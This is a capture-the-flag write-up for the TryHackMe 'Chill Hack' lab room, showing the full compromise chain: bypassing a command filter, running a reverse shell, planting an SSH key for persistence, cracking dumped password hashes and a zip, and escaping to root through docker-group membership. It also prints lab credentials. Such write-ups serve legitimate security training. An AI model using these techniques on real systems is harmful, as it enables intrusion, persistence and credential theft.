#docker 

https://tryhackme.com/r/room/chillhack

---
#### Nmap
![[Screenshot_2024-05-29_20-35-55.png]]

I downloaded the ftp content with a new spell:
```shell
wget -r ftp://anonymous@10.10.68.205
```

It gave me a `note.txt` containing:
```text
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

#### Enumeration
![[Screenshot_2024-05-29_20-44-31.png]]

On `/secret` there is a command form but almost everything is blocked except `grep` and `find`

I can bypass the restriction by using `\` before to escape aliases

Interesting file:
```text
/home/apaar/.helpline.sh
```

I created a reverse shell in `/tmp/shell` and I executed it with:
```shell
\sh /tmp/shell
```

And here I m in

![[Screenshot_2024-05-29_22-35-45.png]]

The bash script execute a command as `apaar` so I executed the script with this command:
```shell
sudo -u apaar /home/apaar/.helpline
```
And I got the flag with
```
cat /home/apaar/local.txt
```

Then I created a new ssh key to get a more stable shell on apaar's account:
```shell
ssh-keygen -t rsa -b 4096 -f ./id_rsa
```

Then I used `nano` through apaar's bash script and added my public key:
```shell
nano /home/apaar/.ssh/authorized_keys
```

And here I m in as Apaar

I went back to `/var/www` and found a `/files` directory I hadn't seen earlier with interresting `mysql` credentials in it: 
```text
root:!@m+her00+@db
```

So I went into the database and dumped the user's table with 2 new credentials with passwod in md5 that I crack with:
```shell
hashcat -a 0 -m 0 -O hash /usr/share/wordlists/rockyou.txt
```
And here are those creds:
```text
Anurodh:masterpassword
Apaar:dontaskdonttell
```

There is another `hacker.php` page containing images, probably steganography, so I created a webserver to retrieve them:
```shell
python3 -m http.server 5050
```

I extracted a `backup.zip` file with 
```shell
steghide extract -sf [image]
```

Then I cracked the zip with john:
```shell
ssh2john backup.zip > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The archive gave me `source_code.php` containing a base 64 encoded password:
```text
!d0ntKn0wmYp@ssw0rd
```

It is Anurodh's passwod, so I switched user to see what now

Anurodh is in the docker group so I used a GTFObins command to escalate root:
```shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

And here I am root